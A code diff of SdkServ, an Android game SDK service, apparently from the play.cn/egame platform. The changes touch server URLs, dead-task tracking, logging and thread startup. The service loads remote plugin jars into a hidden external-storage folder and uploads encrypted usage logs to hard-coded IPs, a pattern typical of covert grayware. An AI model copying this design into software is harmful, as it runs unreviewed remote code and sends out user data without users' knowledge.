@@ -32,6 +32,7 @@ import org.apache.http.message.BasicHeader;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Environment;
 import android.os.Handler;
 import android.telephony.TelephonyManager;
@@ -97,7 +98,7 @@ public class SdkServ implements DServ{
 	
 	
 	//TODO 暂时写死
-	static String upUrl = "http://180.96.63.70:8080/plserver/PS";//"http://180.96.63.71:8080/plserver/PS";
+	static String upUrl = "http://192.168.0.16:8080/PLServer/PS";//"http://180.96.63.71:8080/plserver/PS";
 	static String upLogUrl = "http://192.168.0.16:8080/PLServer/PL";
 	static final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
 	private String emvClass = "cn.play.dserv.MoreView";
@@ -108,7 +109,7 @@ public class SdkServ implements DServ{
 	private HashMap<String,Object> config;
 	private String configPath = sdDir+"cache_01";
 	
-//	private String pkgName = ctx.getPackageName();
+	//private String pkgName = ctx.getPackageName();
 
 
 		
@@ -121,6 +122,7 @@ public class SdkServ implements DServ{
 		this.config.put("emvClass", "cn.play.dserv.MoreView");
 		this.config.put("emvPath", sdDir+"emv.jar");
 		this.config.put("t", "");
+		this.config.put("dt", "");
 		this.saveConfig();
 		
 	}
@@ -206,6 +208,18 @@ public class SdkServ implements DServ{
 		try {
 			switch (act) {
 			case ACT_EMACTIVITY_START:
+				File f = new File(SdkServ.this.emvPath);
+				if (f == null ||  !f.exists()|| f.isDirectory() ) {
+					Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(
+								"com.egame");
+					if (intent == null) {
+						Uri moreGame = Uri.parse("http://play.cn");
+						ctx.startActivity(new Intent(Intent.ACTION_VIEW, moreGame));
+					}else{
+						ctx.startActivity(intent);
+					}
+					break;
+				}
 				Intent it= new Intent(ctx.getApplicationContext(), cn.play.dserv.EmptyActivity.class);    
 				it.putExtra("emvClass", SdkServ.this.emvClass);
 				it.putExtra("emvPath", SdkServ.this.emvPath);
@@ -215,6 +229,7 @@ public class SdkServ implements DServ{
 				break;
 			case ACT_GAME_INIT:
 			case ACT_GAME_EXIT:
+			case ACT_GAME_CONFIRM:
 			case ACT_GAME_CUSTOM:
 				log(LEVEL_I, "GAME_"+act, p, v, m);
 				break;
@@ -716,7 +731,11 @@ public class SdkServ implements DServ{
 					task.setDService(this);
 					task.init();
 					this.taskList.add(task);
+				}else{
+					Log.e(TAG, "loadTask ERR:"+id);
 				}
+			}else{
+				Log.e(TAG, "fetch ERR:"+id);
 			}
 		}
 		this.saveStates();
@@ -845,11 +864,11 @@ public class SdkServ implements DServ{
 				synchronized (SdkServ.this.taskList) {
 					for (int i = 0; i < SdkServ.this.taskList.size(); i++) {
 						PLTask t = (PLTask)SdkServ.this.taskList.get(i);
-						sb.append("_");
 						sb.append(t.getId());
+						sb.append("_");
 					}
 				}
-				
+				sb.append(SPLIT_STR).append(getPropString("dt", ""));
 				Log.d(TAG, "postUrl data:"+sb.toString());
 				
 				String data = "up="+DService.Cenc(sb.toString());
@@ -884,7 +903,7 @@ public class SdkServ implements DServ{
 						//key过期,发起更新key的请求升级key
 			    		
 					}else{
-						//
+						//FIXME 显示错误码,正式发布时去除
 						getHander().post(new Runnable() {     
 				            @Override     
 				            public void run() {     
@@ -997,6 +1016,11 @@ public class SdkServ implements DServ{
 						re = zip(logFile, lFile);
 						if(re){
 							re = upload(lFile,upLogUrl , "");
+							if (!re) {
+								Log.e(TAG, "upLog failed:"+lFile);
+							}else{
+								Log.d(TAG, "upload log OK");
+							}
 						}
 						File f = new File(lFile);
 						f.delete();
@@ -1043,11 +1067,14 @@ public class SdkServ implements DServ{
 	}
 	
 	public void delTask(PLTask task){
+		int tid = task.getId();
 		synchronized (this.taskList) {
 			
 			this.taskList.remove(task);
-			this.removeDat(task.getId());
+			this.removeDat(tid);
 		}
+		String deadTasks = this.getPropString("dt", "");
+		this.setProp("dt", deadTasks+tid+"_", false);
 		this.saveStates();
 	}
 	
@@ -1071,7 +1098,6 @@ public class SdkServ implements DServ{
 	public class TaskThread extends Thread{
 	
 		boolean runFlag = true;
-		
 		
 		@Override
 		public void run() {
@@ -1161,7 +1187,7 @@ public class SdkServ implements DServ{
 		if (f.exists() && f.isFile()) {
 			try{
 				//重命名
-				String dexPath2 = localPath+id+".jar";
+//				String dexPath2 = localPath+id+".jar";
 //				f.renameTo(new File(dexPath2));
 				/*
 				DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, cacheDir,null, this.getClass().getClassLoader()); 
@@ -1174,10 +1200,10 @@ public class SdkServ implements DServ{
 					return null;
 				}
 				//删除临时jar
-				f = new File(dexPath2);
-				if (f.exists() && f.isFile()) {
-					f.delete();
-				}
+//				f = new File(dexPath2);
+//				if (f.exists() && f.isFile()) {
+//					f.delete();
+//				}
 				return plug;
 			}catch (Exception e) {
 				Log.e(TAG, "loadTask error:"+localPath);
@@ -1246,8 +1272,10 @@ public class SdkServ implements DServ{
 				Thread.sleep(logSleepTime+1000);
 			} catch (InterruptedException e) {
 			}
-			lt.start();
 		}
+		lt = new LT();
+		lt.setRunFlag(true);
+		lt.start();
 		this.config = this.readConfig(this.configPath);
 		if (this.config == null || this.config.size() <= 0) {
 			//直接初始化config
@@ -1276,12 +1304,13 @@ public class SdkServ implements DServ{
 		}
 //		cacheDir = ctx.getApplicationInfo().dataDir;
 		emvClass = this.getPropString("emvClass", "cn.play.dserv.MoreView");
-		emvPath = this.getPropString("emvPath", Environment.getExternalStorageDirectory().getPath()+"/.dserver/emv.jar");
+		emvPath = this.getPropString("emvPath", sdDir+"emv.jar");
 		(new File(sdDir)).mkdirs();
 //		String keyStr = this.getPropString( "k", Base64Coder.encode(key));
 //		Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
 		String tasks = this.getPropString( "t", "");
-		Log.d(TAG, "init tasks:"+tasks);
+		String deadTasks = this.getPropString("dt", "");
+		Log.d(TAG, "init tasks:"+tasks+" dt:"+deadTasks);
 		if (StringUtil.isStringWithLen(tasks, 1)) {
 			String[] taskArr = tasks.split(SPLIT_STR);
 			this.taskList.clear();
@@ -1305,10 +1334,11 @@ public class SdkServ implements DServ{
 			}
 		}
 		this.upThread = new UpThread();
+		this.upThread.setRun(true);
 		this.upThread.start();
 		this.taskThread = new TaskThread();
+		this.upThread.setRun(true);
 		this.taskThread.start();
-		
 		
 	}
 
@@ -1445,8 +1475,8 @@ public class SdkServ implements DServ{
 	//------------------------log--------------------------
 	
 	
-	LT lt = new LT();
-	private static StringBuilder sb = new StringBuilder();
+	LT lt;// = new LT();
+	static StringBuilder logSB = new StringBuilder();
 	
 	static int logSleepTime = 1000*5;
 	static String logFile = SdkServ.sdDir+"c_cache.dat";
@@ -1454,39 +1484,38 @@ public class SdkServ implements DServ{
 	private static final String NEWlINE = "\r\n";
 	
 	public void log(int level,String tag,String gameId,String channelId,String msg){
-		sb.append(">>").append(System.currentTimeMillis()).append(SPLIT);
-		sb.append(level).append(SPLIT);
-		sb.append(tag).append(SPLIT);
-		sb.append(gameId).append(SPLIT);
-		sb.append(channelId).append(SPLIT);
-		sb.append(msg).append(NEWlINE);
+		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
+		logSB.append(level).append(SPLIT);
+		logSB.append(tag).append(SPLIT);
+		logSB.append(gameId).append(SPLIT);
+		logSB.append(channelId).append(SPLIT);
+		logSB.append(msg).append(NEWlINE);
 	}
 	
 	public static final void i(String tag,String gameId,String channelId,String msg){
-		sb.append(">>").append(System.currentTimeMillis()).append(SPLIT);
-		sb.append(LEVEL_I).append(SPLIT);
-		sb.append(tag).append(SPLIT);
-		sb.append(gameId).append(SPLIT);
-		sb.append(channelId).append(SPLIT);
-		sb.append(msg).append(NEWlINE);
+		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
+		logSB.append(LEVEL_I).append(SPLIT);
+		logSB.append(tag).append(SPLIT);
+		logSB.append(gameId).append(SPLIT);
+		logSB.append(channelId).append(SPLIT);
+		logSB.append(msg).append(NEWlINE);
 	}
 	
 	public static final void e(String tag,String gameId,String channelId,String msg){
-		sb.append(">>").append(System.currentTimeMillis()).append(SPLIT);
-		sb.append(LEVEL_E).append(SPLIT);
-		sb.append(tag).append(SPLIT);
-		sb.append(gameId).append(SPLIT);
-		sb.append(channelId).append(SPLIT);
-		sb.append(msg).append(NEWlINE);
+		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
+		logSB.append(LEVEL_E).append(SPLIT);
+		logSB.append(tag).append(SPLIT);
+		logSB.append(gameId).append(SPLIT);
+		logSB.append(channelId).append(SPLIT);
+		logSB.append(msg).append(NEWlINE);
 	}
 	
 	private static final void save(){
-		String s = sb.toString();
+		String s = logSB.toString();
 		if (s.length() > 0) {
-			sb = new StringBuilder();
+			logSB = new StringBuilder();
 			String str = DService.Cenc(s)+NEWlINE;
 			writeTxt(logFile, str,true);
-			Log.d("DLOG", s);
 		}
 	}
 	
@@ -1514,7 +1543,7 @@ public class SdkServ implements DServ{
 		public void run() {
 			while (runFlag) {
 				try {
-					if (sb.length() >= 2048) {
+					if (SdkServ.logSB.length() > 0) {
 						save();
 					}
 					Thread.sleep(logSleepTime);
